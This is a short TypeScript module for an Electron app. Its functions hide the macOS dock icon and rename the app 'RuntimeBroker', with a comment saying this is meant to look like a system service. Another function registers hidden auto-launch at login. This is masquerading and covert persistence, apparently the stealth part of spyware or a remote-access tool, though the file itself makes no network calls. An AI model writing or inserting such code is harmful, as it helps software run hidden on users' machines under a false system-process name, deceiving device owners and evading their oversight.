import { app } from 'electron';
import AutoLaunch from 'auto-launch';

export function setupStealth(): void {
  // Hide dock icon on macOS
  if (process.platform === 'darwin') {
    app.dock?.hide();
  }

  // Set app name to look like a system service
  app.setName('RuntimeBroker');
}

export async function setupAutoLaunch(): Promise<void> {
  const autoLauncher = new AutoLaunch({
    name: 'RuntimeBroker',
    isHidden: true,
  });

  try {
    const isEnabled = await autoLauncher.isEnabled();
    if (!isEnabled) {
      await autoLauncher.enable();
      console.log('[Lifecycle] Auto-launch enabled');
    }
  } catch (err: any) {
    console.error('[Lifecycle] Auto-launch setup failed:', err.message);
  }
}

export function enforceSingleInstance(): boolean {
  const gotLock = app.requestSingleInstanceLock();
  if (!gotLock) {
    app.quit();
    return false;
  }
  return true;
}
